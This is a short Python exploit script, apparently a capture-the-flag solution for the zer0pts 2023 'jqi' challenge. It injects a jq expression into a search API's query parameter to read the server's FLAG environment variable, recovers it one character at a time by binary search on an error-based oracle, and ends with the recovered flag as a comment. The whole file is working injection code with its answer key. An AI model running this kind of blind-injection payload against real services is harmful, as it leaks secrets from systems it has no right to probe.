import string
import requests

SERVER_ADDR = "http://jqi.2023.zer0pts.com:8300/api/search"


def send_query(idx: int, mid: int) -> bool:
    r = requests.get(SERVER_ADDR, params={
        "keys": "name",
        "conds": f"\ in name,+(env.FLAG|if explode[{idx}]<{mid} then error(1) else . end)))]# in name"
    })
    print(r.url)
    res = r.text
    if "something wrong" in res:
        return True
    else:
        return False


flag = ""
while not flag.endswith("}"):
    left = 0x20
    right = 0x7f
    while right - left > 1:
        print(left, right)
        mid = (left + right)//2
        is_match = send_query(len(flag), mid)
        if is_match:
            right = mid
        else:
            left = mid
    flag += chr(left)
    print(flag)
print(f"{flag = }")
# flag = 'zer0pts{1dk_why_1t_uses_jq}'
